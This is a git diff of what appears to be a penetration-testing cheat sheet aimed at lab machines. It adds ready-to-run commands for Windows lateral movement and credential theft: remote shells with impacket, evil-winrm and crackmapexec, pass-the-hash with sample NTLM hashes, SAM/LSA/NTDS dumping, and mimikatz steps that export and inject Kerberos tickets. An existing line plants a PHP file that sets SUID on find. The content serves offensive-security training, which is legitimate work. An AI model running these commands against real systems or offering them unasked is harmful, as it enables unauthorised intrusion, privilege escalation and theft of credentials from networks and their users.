@@ -229,6 +229,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Token Impersonation](#token-impersonation)
     - [getsystem](#getsystem)
     - [Pass The Hash](#pass-the-hash-1)
+    - [Pass The Password](#pass-the-password)
     - [Apache lateral movement](#apache-lateral-movement)
     - [Read data stream](#read-data-stream)
     - [PrintNightmare](#printnightmare)
@@ -618,6 +619,16 @@ If something goes wrong
   - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
   - https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
 
+**Access shell**
+- `impacket-wmiexec domain.local/username@IP`
+- `impacket-wmiexec domain.local/username@IP -hashes :HASH`
+- `evil-winrm -u 'username' -p '*******' -i IP -N`
+- `evil-winrm -i IP -u username -p password`
+- `evil-winrm -u username -H ':HASH' -i IP -N`
+- `crackmapexec smb IP -u username -p "password"`
+- `impacket-psexec username:password@IP`
+  - `msf> use exploit/windows/smb/psexec`
+  - https://0xdf.gitlab.io/2020/01/26/digging-into-psexec-with-htb-nest.html
 
 **Save files**
 - `echo "<?php system('chmod +x /usr/bin/find; chmod +s /usr/bin/find');?>" >index.php`
@@ -5811,7 +5822,24 @@ Note: This attack works on Windows 7, 8, early versions of Windows 10, and their
 - **Documentation**: [Meterpreter getsystem | Metasploit Documentation](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)
 
 #### <ins>Pass The Hash</ins>
+- You can pass NTLM hashes, not NTLMv2
 - `pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd`
+- `crackmapexec smb 10.0.3.0/24 -u fcastle -H eb7126ae2c91ed5637hdn3hegve38928398 --local-auth`
+- `crackmapexec winrm 192.168.174.175 -u usernames.txt -H hashes.txt --local-auth`
+- `evil-winrm -i 192.168.174.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808`
+- `impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <USERNAME>:@<IP>`
+- `impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175`
+- with sam hashes, remember to use the correct pair
+- https://labs.withsecure.com/publications/pth-attacks-against-ntlm-authenticated-web-applications
+
+
+#### <ins>Pass The Password</ins>
+- `crackmapexec smb 10.0.3.0/24 -u fcastle -d DOMAIN -p Password1`
+- `crackmapexec smb 192.168.220.240 -u 'guest' -p ''`
+- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
+- `crackmapexec smb 192.168.220.240 -u '' -p '' --sam`
+- `crackmapexec smb 192.168.220.240 -u '' -p '' --lsa`
+- `crackmapexec smb 192.168.220.240 -u '' -p '' --ntds`
 
 
 #### <ins>Apache lateral movement</ins>
@@ -6867,19 +6895,14 @@ Process
 
 #### Pass the Ticket
 
-1. Verify that you are not able to access to a restricted shared folder
-2. Run mimikatz. Execute `#privilege::debug`
-3. `#sekurlsa::tickets /export` export all the TGT/TGS from memory
-4. Verify generated tickets with `PS:\> dir *.kirbi`
-5. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
-6. Inspect the injected ticket with `C:\> klist`
-7. Access the restricted shared folder
-
-Process
-1. `sekurlsa::tickets /export`
-2. `kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`
-3. `klist`
-4. `winrs.exe -r:THMIIS.za.tryhackme.com cmd`
+1. Run mimikatz. Execute `#privilege::debug`
+2. `sekurlsa::tickets /export` export all the TGT/TGS from memory
+3. Verify generated tickets with `PS:\> dir *.kirbi`. Search for an administrator ticket in the local directory
+4. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
+   - Example: `kerberos::ptt [0;193553]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
+5. Inspect the injected ticket with `C:\> klist`
+6. Access the restricted shared folder.
+   - Example `dir \\192.168.179.128\admin$`
 
 #### DCOM
 
